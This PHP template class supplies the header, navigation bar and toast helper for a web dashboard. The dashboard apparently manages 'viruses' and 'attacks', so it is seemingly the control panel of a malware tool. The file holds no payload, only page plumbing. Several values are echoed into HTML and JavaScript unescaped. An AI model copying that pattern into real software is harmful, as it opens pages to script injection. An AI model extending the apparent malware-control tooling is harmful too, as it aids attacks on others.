<?php

namespace Kelvinho\Virus\Singleton;

use Kelvinho\Virus\Attack\AttackFactory;

/**
 * Class HtmlTemplate, provides sort of a shared structure. This is not really elegant, I will factor it later.
 *
 * @package Kelvinho\Virus\Singleton
 */
class HtmlTemplate {
    /**
     * The header (no <head> included. This contains:
     * - Css from 157239n.com
     * - Css from w3school.com
     * - Viewports
     * - .link classes have pointer cursor and their color blue
     * @param bool $darkMode Whether to use dark mode
     */
    public static function header(bool $darkMode): void { ?>
        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata|Lato|PT+Sans|Open+Sans">
        <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta charset="utf-8">
        <?php Styles::all($darkMode); ?>
        <style>
        </style>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
        <script>
            function topNavDeleteAttack(virus_id, attack_id, redirect_attack_id) {
                $.ajax({
                    url: "<?php echo DOMAIN; ?>/vrs/" + virus_id + "/aks/" + attack_id + "/ctrls/delete", type: "POST",
                    success: () => window.location = redirect_attack_id ? ("<?php echo DOMAIN . "/ctrls/viewAttack?vrs=" ?>" + virus_id + "<?php echo "&aks="; ?>" + redirect_attack_id) : "<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id,
                    error: () => toast.displayOfflineMessage("Can't delete attack.")
                });
            }

            function topNavToggleHold(isHolding) {
                if (isHolding) $.ajax({
                    url: "<?php echo DOMAIN; ?>/ctrls/removeHold", type: "POST",
                    success: () => window.location = "<?php echo DOMAIN ?>",
                    error: () => toast.displayOfflineMessage("Can't remove hold.")
                })
                else $.ajax({
                    url: "<?php echo DOMAIN; ?>/ctrls/applyHold", type: "POST",
                    success: () => window.location = "<?php echo DOMAIN ?>",
                    error: () => toast.displayOfflineMessage("Can't apply hold.")
                });
            }

            class Demo {
                constructor(id, slides) {
                    this.id = id;
                    this.slides = slides;
                    this.slideIdx = 0;
                    this.select().css("display", "block").css("opacity", 1);
                    this.progressBar = $("#demoProgress" + this.id);
                }

                select() {
                    return $("#demoContent" + this.id + "-" + this.slides[this.slideIdx]);
                }

                doBulk(cb) {
                    this.select().css("display", "none");
                    cb();
                    this.select().css("display", "block");
                    this.progressBar.css("width", Math.round(100 * this.slideIdx / (this.slides.length - 1)) + "%");
                }

                next() {
                    if (this.slideIdx + 1 === this.slides.length) return;
                    this.doBulk(() => this.slideIdx++);
                }

                prev() {
                    if (this.slideIdx === 0) return;
                    this.doBulk(() => this.slideIdx--);
                }
            }
        </script>
    <?php }

    public static function topNavigation(string $virusName = null, string $virus_id = null, string $attack_id = null, AttackFactory $attackFactory = null, bool $holding = null): void { ?>
        <div class="w3-bar w3-light-grey w3-card" id="topBar" style="position: fixed;left: 0;top: 0;z-index: 200;">
            <a href="<?php echo DOMAIN; ?>" class="w3-bar-item w3-button">Dashboard</a>
            <?php if ($virusName !== null) { ?>
                <a href="<?php echo DOMAIN . "/ctrls/viewVirus?vrs=$virus_id"; ?>"
                   class="w3-bar-item w3-button w3-border-left"><span
                            class="w3-hide-small">Virus: </span><?php echo $virusName; ?></a>
            <?php }
            if ($attack_id !== null) {
                $attack = $attackFactory->get($attack_id);
                $around = $attack->getAround();
                $redirect_attack_id = $around[0] !== null ? $around[0] : ($around[1] !== null ? $around[1] : ""); ?>
                <div class="w3-bar-item w3-hide-small" style="padding: 0;margin-left: 16%">
                    <?php if ($around[0] !== null) { ?>
                        <a href="<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks=" . $around[0]; ?>"
                           class="w3-button" style="height: 38px;"><i class="material-icons">keyboard_arrow_left</i></a>
                    <?php } ?>
                    <a onclick="topNavDeleteAttack('<?php echo $virus_id; ?>', '<?php echo $attack_id; ?>', '<?php echo $redirect_attack_id; ?>')"
                       class="w3-button" style="height: 38px;"><i class="material-icons">delete</i></a>
                    <?php if ($around[1] !== null) { ?>
                        <a href="<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks=" . $around[1]; ?>"
                           class="w3-button" style="height: 38px;"><i
                                    class="material-icons">keyboard_arrow_right</i></a>
                    <?php } ?>
                </div>
            <?php } ?>
            <div class="w3-bar-item w3-button w3-right w3-dropdown-hover" style="height: 38px;"><i
                        class="material-icons">settings</i>
                <div class="w3-dropdown-content w3-bar-block w3-card-4" style="position: fixed;right: 0; top: 38px;">
                    <a href="<?php echo DOMAIN . "/profile"; ?>" class="w3-bar-item w3-button">Profile</a>
                    <!-- <a href="<?php echo DOMAIN . "/tutorials"; ?>" class="w3-bar-item w3-button">Tutorials</a> -->
                    <a href="<?php echo DOMAIN . "/faq"; ?>" class="w3-bar-item w3-button">FAQ</a>
                    <a href="<?php echo DOMAIN . "/logout"; ?>" class="w3-bar-item w3-button">Sign out</a>
                </div>
            </div>
            <?php
            if ($holding !== null) { ?>
                <a onclick="<?php echo $holding ? "topNavToggleHold(true)" : "topNavToggleHold(false)"; ?>"
                   class="w3-bar-item w3-button w3-right w3-border-right <?php echo $holding ? "w3-red" : ""; ?> <?php echo $virus_id !== null ? "w3-hide-small" : ""; ?>">Hold</a>
            <?php } ?>
        </div>
        <br><br>
    <?php }

    public static function body(): void { ?>
        <div id="toast"></div><?php
    }

    /**
     * The scripts tag. This contains:
     * - jquery minified cdn
     * - javascript from 157239n.com
     */
    public static function scripts(): void { ?>
        <script>
            /**
             * A simple pop up message, inspired by Android Studio's Toast. This is implemented so that it's dead simple, and you only
             * have to call .display(content) to display it.
             */
            class Toast {
                constructor() {
                    /** @type {number} this.instances */ this.instances = 0; // this is so that only the latest call's turnOff() will actually turn it off
                    /** @type {jQuery} this.objectReference */ this.objectReference = document.querySelector("#toast");
                }

                /**
                 * Displays toast with content.
                 *
                 * @param content
                 * @param {number} timeout Optional time out. Defaults to 3 seconds.
                 */
                display(content, timeout = 3000) {
                    this.instances++;
                    this.objectReference.innerHTML = content;
                    this.objectReference.classList.add("activated");
                    setTimeout(this.turnOff, timeout);
                }

                displayOfflineMessage = (content) => this.display(content + " Please check your internet connection, or report an issue");
                /** Displays a message, and keeps it online until another display() is called. */
                persistTillNextDisplay = (content) => (this.objectReference.innerHTML = content, this.objectReference.classList.remove("activated"));
                /** Fades out the toast. Expected to be called by a timeout only. */
                turnOff = () => (((toast.instances === 1) ? toast.objectReference.classList.remove("activated") : ""), toast.instances--);
            }

            /** @type {Toast} toast */ const toast = new Toast();

            function autoAdjustHeight(elem) {
                elem.each(function () {
                    this.setAttribute('style', 'height:' + (this.scrollHeight) + 'px;overflow-y:hidden;resize:none;');
                }).on('input', function () {
                    this.style.height = 'auto';
                    this.style.height = (this.scrollHeight) + 'px';
                });
            }

            setInterval(() => $.ajax({
                url: "<?php echo DOMAIN . "/ping"; ?>",
                error: () => toast.display("No internet connection")
            }), 1000 * 60 * 5);
        </script>
    <?php }
}
